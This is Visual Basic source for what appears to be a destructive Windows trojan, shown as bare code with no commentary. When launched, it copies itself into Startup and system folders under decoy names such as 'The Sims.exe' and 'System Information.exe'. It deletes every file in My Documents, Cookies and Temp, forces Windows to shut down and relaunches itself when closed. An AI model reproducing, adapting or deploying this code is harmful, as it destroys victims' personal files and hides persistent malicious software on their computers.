   Private Sub Form_Load()
   On Error Resume Next
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\" + App.EXEName + ".exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\Start Menu\Programs\Startup\" + App.EXEName + ".exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\" + App.EXEName + ".exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Autoexec.exe"
   MkDir "C:\Program Files\System"
   MkDir "C:\Coding1"
   MkDir "C:\Coding2"
   MkDir "C:\Coding3"
   MkDir "C:\Coding4"
   MkDir "C:\Coding5"
   MkDir "C:\Coding6"
   MkDir "C:\Coding7"
   MkDir "C:\Help"
   MkDir "C:\The Sims"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Program Files\System\System.exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\The Sims\The Sims.exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\Desktop\System Information.exe"
   ChDir "C:\My Documents"
   Kill "*.*"
   ChDir "C:\Windows\Cookies"
   Kill "*.*"
   ChDir "C:\Windows\Temp"
   Kill "*.*"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\MyDocuments" + App.EXEName + ".exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Windows\Start Menu\Programs\" + App.EXEName + ".exe"
   Shell ("Rundll32.exe user,exitwindows")
   End Sub

   Private Sub Form_Unload(Cancel As Integer)
   Shell (App.Path + "\" + App.EXEName + ".exe")
   End Sub
